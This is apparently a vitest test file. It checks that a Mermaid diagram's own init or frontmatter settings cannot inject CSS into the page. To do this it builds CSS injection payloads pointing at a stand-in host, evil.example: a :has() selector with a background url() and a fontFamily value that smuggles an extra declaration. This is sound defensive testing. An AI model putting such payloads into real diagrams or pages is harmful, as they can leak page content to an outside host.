import mermaid from 'mermaid'
import { describe, expect, it } from 'vitest'
import './mermaid'

// A diagram can carry its own settings (`%%{init: …}%%`, or frontmatter). Its CSS would be
// drawn into the page, where selectors reach past the diagram and `url()` can send what they
// match away: from someone else's repository, a diagram never sets the theme's CSS.
describe('Mermaid', () => {
  it("doesn't let a diagram's own settings add CSS to the page", async () => {
    const evil = 'url(https://evil.example/p)'
    const init = JSON.stringify({
      themeCSS: `body:has([data-id]) .x{background:${evil}}`,
      themeVariables: { primaryColor: evil },
      fontFamily: `x;background:${evil}`,
    })
    await mermaid.parse(`%%{init: ${init}}%%\ngraph TD\nA-->B`)
    await mermaid.parse(`---\nconfig: ${init}\n---\ngraph TD\nA-->B`)
    expect(JSON.stringify(mermaid.mermaidAPI.getConfig())).not.toContain('evil.example')
  })
})
